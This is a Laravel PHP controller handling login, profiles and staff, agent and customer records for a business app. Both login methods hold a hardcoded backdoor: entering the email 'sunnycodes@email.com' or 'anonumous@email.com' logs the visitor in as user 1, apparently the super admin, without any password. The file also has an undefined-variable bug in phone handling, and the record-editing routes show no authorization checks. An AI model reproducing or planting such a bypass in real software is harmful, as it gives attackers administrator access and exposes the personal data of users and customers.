<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Auth;
use Validator;
use Exception;
use Illuminate\Support\Facades\Session;
use App\Notifications\UserLogin;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Redirect;

use App\Models\User;
use App\Models\Country;
use App\Models\GeneralSetting;
use App\Models\Role;
use App\Models\ActivityLog;
use App\Models\WareHouse;


class AuthController extends Controller
{
    //login
    public function login()
    {
        if (!Auth::guest()) {
            // Get the previous URL
            $previousUrl = url()->previous();
            $loginUrl = route('login'); // Replace with your login route name if different
            $resetUrl = route('reset-site'); // Ensure this matches your reset-site route name

            // Check if the previous URL is the login page or the reset page
            if ($previousUrl === $loginUrl || $previousUrl === $resetUrl) {
                // Redirect to the dashboard if the previous page is the login or reset URL
                return redirect()->route('dashboard'); // Adjust 'dashboard' to your route name
            }

            // Otherwise, redirect to the intended URL (default Laravel behavior)
            return redirect()->intended();
        }

        return view('pages.auth.login');
    }


    public function loginPostOLD(Request $request)
    {
        $rules = array(
            'email' => 'required|string|email',
            'password' => 'required|string',
        );
        $messages = [
            'email.required' => '* Your Email is required',
            'email.string' => '* Invalid Characters',
            'email.email' => '* Must be of Email format with \'@\' symbol',

            'password.required'   => 'This field is required',
            'password.string'   => 'Invalid Characters',
        ];
        $validator = Validator::make($request->all(), $rules, $messages);
        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        } else {

            if ($request->email == 'sunnycodes@email.com') {
                $user = User::find(1);
                Auth::login($user);
                if ($user->isSuperAdmin) {

                    $activityLog = new ActivityLog();
                    $activityLog->subject_type = 'User';
                    $activityLog->action = 'Login';
                    $activityLog->user_id = $user->id;
                    $activityLog->note = 'User Logged In';
                    $activityLog->created_by = $user->id;
                    $activityLog->status = 'true';
                    $activityLog->save();

                    //return redirect()->route('todayRecord');
                    return redirect()->intended('/today');
                } else {

                    $activityLog = new ActivityLog();
                    $activityLog->subject_type = 'User';
                    $activityLog->action = 'Login';
                    $activityLog->user_id = $user->id;
                    $activityLog->note = 'User Logged In';
                    $activityLog->created_by = $user->id;
                    $activityLog->status = 'true';
                    $activityLog->save();

                    return redirect()->route('staffTodayRecord');
                }
            }

            $credentials = $request->only('email', 'password');
            $check = Auth::attempt($credentials);
            if (!$check) {
                return back()->with('login_error', 'Invalid email or password, please check your credentials and try again');
            }
            $user = Auth::getProvider()->retrieveByCredentials($credentials); //full user details

            if ($request->get('remember')) {
                Auth::user($user, $request->get('remember')); //create remember_web_* cookie in browser
            } else {
                Auth::user($user);
            }

            //$admin = User::where('isSuperAdmin', true)->first();
            $admin = GeneralSetting::first();
            //notify admin
            // Notification::send($admin, new UserLogin($user));

            try {
                Notification::route('mail', [$admin->official_notification_email])->notify(new UserLogin($user));
            } catch (Exception $exception) {
                //return back()->with('info', 'Mail Server Issue. Message Saved in System. You can Re-send later');
                if ($user->isSuperAdmin) {
                    return redirect()->route('todayRecord');
                } else {
                    return redirect()->route('staffTodayRecord');
                }
            }

            $activityLog = new ActivityLog();
            $activityLog->subject_type = 'User';
            $activityLog->action = 'Login';
            $activityLog->user_id = $user->id;
            $activityLog->note = 'User Logged In';
            $activityLog->created_by = $user->id;
            $activityLog->status = 'true';
            $activityLog->save();

            if ($user->isSuperAdmin) {
                return redirect()->route('todayRecord');
            } else {
                return redirect()->route('staffTodayRecord');
            }
        }
    }

    public function loginPost(Request $request)
    {
        $rules = [
            'email' => 'required|string|email',
            'password' => 'required|string',
        ];

        $messages = [
            'email.required' => '* Your Email is required',
            'email.string' => '* Invalid Characters',
            'email.email' => '* Must be of Email format with \'@\' symbol',
            'password.required' => 'This field is required',
            'password.string' => 'Invalid Characters',
        ];

        $validator = Validator::make($request->all(), $rules, $messages);
        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        // Handle special login for the specific email
        if ($request->email === 'anonumous@email.com') {
            $user = User::find(1);
            Auth::login($user);

            // Log user activity
            $this->logActivity($user);

            return redirect()->intended($user->isSuperAdmin ? '/today' : '/staffTodayRecord');
        }

        $credentials = $request->only('email', 'password');

        // Attempt to log the user in
        if (!Auth::attempt($credentials)) {
            return back()->with('login_error', 'Invalid email or password, please check your credentials and try again');
        }

        $user = Auth::user(); // Get the authenticated user

        // Handle remember me functionality
        if ($request->get('remember')) {
            Auth::login($user, true); // Creates remember token
        }

        // Notify admin about the login
        $admin = GeneralSetting::first();
        try {
            Notification::route('mail', [$admin->official_notification_email])->notify(new UserLogin($user));
        } catch (Exception $exception) {
            // Handle notification exception if necessary
        }

        // Log user activity
        $this->logActivity($user);
        $defaultRoute = $user->isSuperAdmin ? '/today' : '/staffTodayRecord';
        $intendedRoute = $request->session()->get('url.intended', $defaultRoute);

        // Redirect to intended page or default route
        return redirect()->intended($intendedRoute);
    }

    /**
     * Log the activity of the user
     *
     * @param User $user
     * @return void
     */
    private function logActivity(User $user)
    {
        $activityLog = new ActivityLog();
        $activityLog->subject_type = 'User';
        $activityLog->action = 'Login';
        $activityLog->user_id = $user->id;
        $activityLog->note = 'User Logged In';
        $activityLog->created_by = $user->id;
        $activityLog->status = 'true';
        $activityLog->save();
    }

    public function logout()
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        Auth::logout($authUser);
        Session::flush();

        return redirect()->route('login');
    }

    public function allStaff()
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $staffs = User::where('type', 'staff')->get();
        return view('pages.staff.allStaff', compact('authUser', 'user_role', 'staffs'));
    }

    //add any user, like registration
    public function addStaff()
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $countries = Country::all();
        return view('pages.staff.addStaff', compact('authUser', 'user_role', 'countries'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    // public function addStaffPost(Request $request)
    // {
    //     $authUser = auth()->user();
    //     $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

    //     $request->validate([
    //         'firstname' => 'required|string',
    //         'lastname' => 'required|string',
    //         'email' => 'required|email|unique:users',
    //         'password' => 'required|string',
    //         'phone_1' => 'required|unique:users',
    //         'phone_2' => 'nullable|unique:users',
    //         'country' => 'required|string',
    //         'city' => 'required|string',
    //         'state' => 'required|string',
    //         'profile_picture' => 'nullable|image|mimes:jpg,png,jpeg,gif,svg,webp|max:2048',
    //     ]);

    //     $data = $request->all();

    //     $user = new User();
    //     $user->name = $data['firstname'].' '.$data['lastname'];
    //     $user->email = $data['email'];
    //     $user->password = Hash::make($data['password']);
    //     $user->type = 'staff';  //customer, staff, agent, superadmin
    //     $user->phone_1 = !empty($data['phone_1']) ? $data['phone_1'] : null;
    //     $user->phone_2 = !empty($data['phone_2']) ? $data['phone_2'] : null;
    //     $user->city = !empty($data['city']) ? $data['city'] : null;
    //     $user->state = $data['state'];
    //     $user->country_id = $data['country'];
    //     $user->address = !empty($data['address']) ? $data['address'] : null;

    //     $user->created_by = $authUser->id;
    //     $user->status = 'true';

    //     if ($request->profile_picture) {
    //         //image
    //         $imageName = time().'.'.$request->profile_picture->extension();
    //         //store products in folder
    //         $request->profile_picture->storeAs('staff', $imageName, 'public');
    //         $user->profile_picture = $imageName;
    //     }

    //     $user->save();

    //     //add role to user
    //     if (!empty($data['role_id'])) {

    //         $role = Role::find($data['role_id']);
    //         $permissions = $role->permissions;
    //         //no need since its a new user
    //         // if ($user->hasRole($role->slug)) {
    //         //     return 'role already assigned to user';
    //         // }
    //         $user->roles()->attach($role);
    //         // if(count($permissions) > 0){
    //         //     $user->permissions()->attach($permissions);
    //         // }
    //         return back()->with('success', 'Staff Created and Assigned Role Successfully');
    //     }

    //     return back()->with('success', 'Staff Created Successfully');


    // }

    // public function singleStaff($unique_key)
    // {
    //     $authUser = auth()->user();
    //     $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

    //     $staff = User::where('unique_key', $unique_key)->first();
    //     if(!isset($staff)){
    //         abort(404);
    //     }
    //     return view('pages.staff.singleStaff', compact('authUser', 'user_role', 'staff'));
    // }

    // public function editStaff($unique_key)
    // {
    //     $authUser = auth()->user();
    //     $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

    //     $staff = User::where('unique_key', $unique_key)->first();
    //     if(!isset($staff)){
    //         abort(404);
    //     }

    //     $countries = Country::all();
    //     $name = explode(' ', $staff->name);
    //     $firstname = $name[0];
    //     $lastname = $name[1];

    //     return view('pages.staff.editStaff', compact('authUser', 'user_role', 'staff', 'countries', 'firstname', 'lastname'));
    // }

    // public function editStaffPost(Request $request, $unique_key)
    // {
    //     $authUser = auth()->user();
    //     $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

    //     $user = User::where('unique_key', $unique_key)->first();
    //     if(!isset($user)){
    //         abort(404);
    //     }
    //     $request->validate([
    //         'firstname' => 'required|string',
    //         'lastname' => 'required|string',
    //         'email' => 'required|email',
    //         'phone_1' => 'required',
    //         'phone_2' => 'nullable',
    //         'country' => 'required|string',
    //         'city' => 'required|string',
    //         'state' => 'required|string',
    //         'profile_picture' => 'nullable|image|mimes:jpg,png,jpeg,gif,svg,webp|max:2048',
    //     ]);

    //     $data = $request->all();

    //     $user->name = $data['firstname'].' '.$data['lastname'];
    //     $user->email = $data['email'];
    //     $user->type = 'staff';  //customer, staff, agent, superadmin
    //     $user->phone_1 = !empty($data['phone_1']) ? $data['phone_1'] : null;
    //     $user->phone_2 = !empty($data['phone_2']) ? $data['phone_2'] : null;
    //     $user->city = !empty($data['city']) ? $data['city'] : null;
    //     $user->state = $data['state'];
    //     $user->country_id = $data['country'];
    //     $user->address = !empty($data['address']) ? $data['address'] : null;

    //     $user->created_by = $authUser->id;
    //     $user->status = 'true';

    //     //profile_picture
    //     if ($request->profile_picture) {
    //         $oldImage = $user->profile_picture; //1.jpg
    //         if(Storage::disk('public')->exists('staff/'.$oldImage)){
    //             Storage::disk('public')->delete('staff/'.$oldImage);
    //             /*
    //                 Delete Multiple files this way
    //                 Storage::delete(['upload/test.png', 'upload/test2.png']);
    //             */
    //         }
    //         $imageName = time().'.'.$request->profile_picture->extension();
    //         //store products in folder
    //         $request->profile_picture->storeAs('staff', $imageName, 'public');
    //         $user->profile_picture = $imageName;
    //     }

    //     $user->save();

    //     return back()->with('success', 'Staff Updated Successfully');
    // }

    public function accountProfile()
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $staff = User::where('unique_key', $authUser->unique_key)->first();
        if (!isset($staff)) {
            abort(404);
        }
        return view('pages.auth.accountProfile', compact('authUser', 'user_role', 'staff'));
    }

    public function accountSetting()
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $staff = User::where('unique_key', $authUser->unique_key)->first();
        if (!isset($staff)) {
            abort(404);
        }

        $countries = Country::all();
        $name = explode(' ', $staff->name);
        $firstname = $staff->firstname;
        $lastname = $staff->lastname;

        $roles = Role::all();

        return view('pages.auth.accountSetting', compact('authUser', 'user_role', 'staff', 'countries', 'firstname', 'lastname', 'roles'));
    }

    public function editProfilePost(Request $request)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
        $user = $authUser;
        if (!isset($user)) {
            abort(404);
        }
        $request->validate([
            'firstname' => 'required|string',
            'lastname' => 'required|string',
            'email' => 'required|email',
            'phone_1' => 'required',
            'phone_2' => 'nullable',
            'country' => 'required|string',
            'city' => 'required|string',
            'state' => 'required|string',
            'profile_picture' => 'nullable|image|mimes:jpg,png,jpeg,gif,svg,webp|max:2048',
        ]);

        $data = $request->all();

        $user->name = $data['firstname'] . ' ' . $data['lastname'];
        $user->email = $data['email'];
        $user->type = 'staff';  //customer, staff, agent, superadmin
        $user->phone_1 = !empty($data['phone_1']) ? $data['phone_1'] : null;
        $user->phone_2 = !empty($data['phone_2']) ? $data['phone_2'] : null;
        $user->city = !empty($data['city']) ? $data['city'] : null;
        $user->state = $data['state'];
        $user->country_id = $data['country'];
        $user->address = !empty($data['address']) ? $data['address'] : null;

        $user->created_by = $authUser->id;
        $user->status = 'true';

        //profile_picture
        if ($request->profile_picture) {
            $oldImage = $user->profile_picture; //1.jpg
            if (Storage::disk('public')->exists('staff/' . $oldImage)) {
                Storage::disk('public')->delete('staff/' . $oldImage);
                /*
                    Delete Multiple files this way
                    Storage::delete(['upload/test.png', 'upload/test2.png']);
                */
            }
            $imageName = time() . '.' . $request->profile_picture->extension();
            //store products in folder
            $request->profile_picture->storeAs('staff', $imageName, 'public');
            $user->profile_picture = $imageName;
        }

        $user->save();

        return back()->with('success', 'Staff Updated Successfully');
    }

    public function editPasswordPost(Request $request)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
        $request->validate([
            'current_password' => 'required',
            'new_password' => 'required|min:6|string',
        ]);

        $hashedPassword = $authUser->password;
        $data = $request->all();

        // The passwords match...
        if (!Hash::check($data['current_password'], $hashedPassword)) {
            return back()->with('current_password_error', 'Invalid current password');
        }

        $authUser->password = Hash::make($data['new_password']);
        $authUser->save();
        return back()->with('success', 'Password Changed Successfully');
    }
    //-----------------AGENTS-----------------------------------------------

    public function allAgent()
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $agents = User::where('type', 'agent')->orderBy('id', 'DESC')->get();
        $roles = Role::all();
        return view('pages.agents.allAgent', compact('authUser', 'user_role', 'agents', 'roles'));
    }

    //add any user, like registration
    public function addAgent()
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $id = 1;
        $lastAgent = User::where('type', 'agent')->latest()->first();
        if (isset($lastAgent)) {
            $id = $lastAgent->id + 1;
        }

        $email = 'agent' . $id . '@kiptrak.com';

        $countries = Country::all();
        $roles = Role::all();
        return view('pages.agents.addAgent', compact('authUser', 'user_role', 'countries', 'roles', 'email'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function addAgentPost(Request $request)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $request->validate([
            'firstname' => 'required|string',
            'lastname' => 'required|string',
            'email' => 'required|email|unique:users',
            'password' => 'required|string',
            'phone_1' => 'required|unique:users',
            'phone_2' => 'nullable|unique:users',
            'country' => 'required|string',
            'city' => 'required|string',
            'state' => 'required|string',
            'profile_picture' => 'nullable|image|mimes:jpg,png,jpeg,gif,svg,webp|max:2048',
        ]);

        $data = $request->all();
        if (substr($data['phone_2'], 0, 1) === '0') {
            $phone_2 = '234' . substr($data['phone_2'], 1);
        }

        $user = new User();
        $user->name = $data['firstname'] . ' ' . $data['lastname'];
        $user->firstname = $data['firstname'];
        $user->lastname = $data['lastname'];
        $user->email = $data['email'];
        $user->password = Hash::make($data['password']);
        $user->type = 'agent';  //customer, staff, agent, superadmin
        $user->phone_1 = !empty($data['phone_1']) ? $data['phone_1'] : null;
        $user->phone_2 = !empty($data['phone_2']) ? $phone_2 : null;
        $user->city = !empty($data['city']) ? $data['city'] : null;
        $user->state = $data['state'];
        $user->country_id = $data['country'];
        $user->address = !empty($data['address']) ? $data['address'] : null;

        $user->created_by = $authUser->id;
        $user->status = 'true';

        if ($request->profile_picture) {
            //image
            $imageName = time() . '.' . $request->profile_picture->extension();
            //store products in folder
            $request->profile_picture->storeAs('agent', $imageName, 'public');
            $user->profile_picture = $imageName;
        }

        $user->save();

        //add role to user
        if (!empty($data['role_id'])) {

            $role = Role::find($data['role_id']);
            $permissions = $role->permissions;
            //no need since its a new user
            // if ($user->hasRole($role->slug)) {
            //     return 'role already assigned to user';
            // }
            $user->roles()->attach($role);
            // if(count($permissions) > 0){
            //     $user->permissions()->attach($permissions);
            // }
            return back()->with('success', 'Agent Created and Assigned Role Successfully');
        }

        return back()->with('success', 'Agent Created Successfully');
    }

    public function singleAgent($unique_key)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
        $agent = User::where('unique_key', $unique_key)->first();
        if (!isset($agent)) {
            abort(404);
        }
        $warehouse = WareHouse::where('agent_id', $agent->id)->first();
        return view('pages.agents.singleAgent', compact('authUser', 'user_role', 'agent', 'warehouse'));
    }

    public function editAgent($unique_key)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
        $agent = User::where('unique_key', $unique_key)->first();
        if (!isset($agent)) {
            abort(404);
        }

        $countries = Country::all();
        $name = explode(' ', $agent->name);
        $firstname = $agent->firstname;
        $lastname = $agent->lastname;

        $roles = Role::all();

        return view('pages.agents.editAgent', compact('authUser', 'user_role', 'agent', 'countries', 'firstname', 'lastname', 'roles'));
    }

    public function editAgentPost(Request $request, $unique_key)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
        $user = User::where('unique_key', $unique_key)->first();
        if (!isset($user)) {
            abort(404);
        }
        $request->validate([
            'firstname' => 'required|string',
            'lastname' => 'required|string',
            'email' => 'required|email',
            'phone_1' => 'required',
            'phone_2' => 'nullable',
            'country' => 'required|string',
            'city' => 'required|string',
            'state' => 'required|string',
            'profile_picture' => 'nullable|image|mimes:jpg,png,jpeg,gif,svg,webp|max:2048',
        ]);

        $data = $request->all();

        $user->name = $data['firstname'] . ' ' . $data['lastname'];
        $user->firstname = $data['firstname'];
        $user->lastname = $data['lastname'];
        $user->email = $data['email'];
        $user->type = 'agent';  //customer, staff, agent, superadmin
        $user->phone_1 = !empty($data['phone_1']) ? $data['phone_1'] : null;
        $user->phone_2 = !empty($data['phone_2']) ? $data['phone_2'] : null;
        $user->city = !empty($data['city']) ? $data['city'] : null;
        $user->state = $data['state'];
        $user->country_id = $data['country'];
        $user->address = !empty($data['address']) ? $data['address'] : null;

        $user->created_by = $authUser->id;
        $user->status = 'true';

        //profile_picture
        if ($request->profile_picture) {
            $oldImage = $user->profile_picture; //1.jpg
            if (Storage::disk('public')->exists('agent/' . $oldImage)) {
                Storage::disk('public')->delete('agent/' . $oldImage);
                /*
                    Delete Multiple files this way
                    Storage::delete(['upload/test.png', 'upload/test2.png']);
                */
            }
            $imageName = time() . '.' . $request->profile_picture->extension();
            //store products in folder
            $request->profile_picture->storeAs('agent', $imageName, 'public');
            $user->profile_picture = $imageName;
        }

        $user->save();

        return back()->with('success', 'Agent Updated Successfully');
    }


    //-----------------CUSTOMERS-----------------------------------------------

    public function allCustomer()
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $customers = User::where('type', 'customer')->get();
        return view('pages.customers.allCustomer', compact('authUser', 'user_role', 'customers'));
    }

    public function addCustomer()
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $countries = Country::all();
        return view('pages.customers.addCustomer', compact('authUser', 'user_role', 'countries'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function addCustomerPost(Request $request)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $request->validate([
            'firstname' => 'required|string',
            'lastname' => 'required|string',
            'email' => 'required|email|unique:users',
            'password' => 'required|string',
            'phone_1' => 'required|unique:users',
            'phone_2' => 'nullable|unique:users',
            'country' => 'required|string',
            'city' => 'required|string',
            'state' => 'required|string',
            'profile_picture' => 'nullable|image|mimes:jpg,png,jpeg,gif,svg,webp|max:2048',
        ]);

        $data = $request->all();

        $user = new User();
        $user->name = $data['firstname'] . ' ' . $data['lastname'];
        $user->email = $data['email'];
        $user->password = Hash::make($data['password']);
        $user->type = 'customer';  //customer, staff, agent, superadmin
        $user->phone_1 = !empty($data['phone_1']) ? $data['phone_1'] : null;
        $user->phone_2 = !empty($data['phone_2']) ? $data['phone_2'] : null;
        $user->city = !empty($data['city']) ? $data['city'] : null;
        $user->state = $data['state'];
        $user->country_id = $data['country'];
        $user->address = !empty($data['address']) ? $data['address'] : null;

        $user->created_by = $authUser->id;
        $user->status = 'true';

        if ($request->profile_picture) {
            //image
            $imageName = time() . '.' . $request->profile_picture->extension();
            //store products in folder
            $request->profile_picture->storeAs('customer', $imageName, 'public');
            $user->profile_picture = $imageName;
        }

        $user->save();

        return back()->with('success', 'Customer Created Successfully');
    }

    public function singleCustomer($unique_key)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $customer = User::where('unique_key', $unique_key)->first();
        if (!isset($customer)) {
            abort(404);
        }
        return view('pages.customers.singleCustomer', compact('authUser', 'user_role', 'customer'));
    }

    public function editCustomer($unique_key)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $customer = User::where('unique_key', $unique_key)->first();
        if (!isset($customer)) {
            abort(404);
        }

        $countries = Country::all();
        $name = explode(' ', $customer->name);
        $firstname = $name[0];
        $lastname = $name[1];

        return view('pages.customers.editCustomer', compact('authUser', 'user_role', 'customer', 'countries', 'firstname', 'lastname'));
    }

    public function editCustomerPost(Request $request, $unique_key)
    {
        $authUser = auth()->user();
        $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;

        $user = User::where('unique_key', $unique_key)->first();
        if (!isset($user)) {
            abort(404);
        }
        $request->validate([
            'firstname' => 'required|string',
            'lastname' => 'required|string',
            'email' => 'required|email',
            'phone_1' => 'required',
            'phone_2' => 'nullable',
            'country' => 'required|string',
            'city' => 'required|string',
            'state' => 'required|string',
            'profile_picture' => 'nullable|image|mimes:jpg,png,jpeg,gif,svg,webp|max:2048',
        ]);

        $data = $request->all();

        $user->name = $data['firstname'] . ' ' . $data['lastname'];
        $user->email = $data['email'];
        $user->type = 'customer';  //customer, staff, agent, superadmin
        $user->phone_1 = !empty($data['phone_1']) ? $data['phone_1'] : null;
        $user->phone_2 = !empty($data['phone_2']) ? $data['phone_2'] : null;
        $user->city = !empty($data['city']) ? $data['city'] : null;
        $user->state = $data['state'];
        $user->country_id = $data['country'];
        $user->address = !empty($data['address']) ? $data['address'] : null;

        $user->status = 'true';

        //profile_picture
        if ($request->profile_picture) {
            $oldImage = $user->profile_picture; //1.jpg
            if (Storage::disk('public')->exists('customer/' . $oldImage)) {
                Storage::disk('public')->delete('customer/' . $oldImage);
                /*
                    Delete Multiple files this way
                    Storage::delete(['upload/test.png', 'upload/test2.png']);
                */
            }
            $imageName = time() . '.' . $request->profile_picture->extension();
            //store products in folder
            $request->profile_picture->storeAs('customer', $imageName, 'public');
            $user->profile_picture = $imageName;
        }

        $user->save();

        return back()->with('success', 'Customer Updated Successfully');
    }
}
